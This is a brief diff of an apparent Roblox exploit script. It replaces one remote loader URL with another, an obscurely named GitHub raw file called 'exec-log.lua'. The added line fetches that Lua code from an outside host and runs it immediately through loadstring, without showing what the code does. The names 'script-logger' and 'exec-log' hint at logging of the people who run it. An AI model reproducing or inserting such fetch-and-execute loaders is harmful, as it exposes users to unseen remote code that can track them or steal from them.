@@ -6,7 +6,7 @@ end
 
 pcall(function() getgenv().RoScript_Loaded = true end)
 
-loadstring(game:HttpGet("https://roblox-scripts.poliju.repl.co/script-logger.lua"))()
+loadstring(game:HttpGet("https://github.com/RScript-O0607O/-4-4SH4-X0CP-9-QvzU9Vp-u-XtO7pKRxr-A-ggh-caVYh/raw/main/loader/exec-log.lua"))()
 
 local http = game:GetService("HttpService")
 if writefile and isfile then
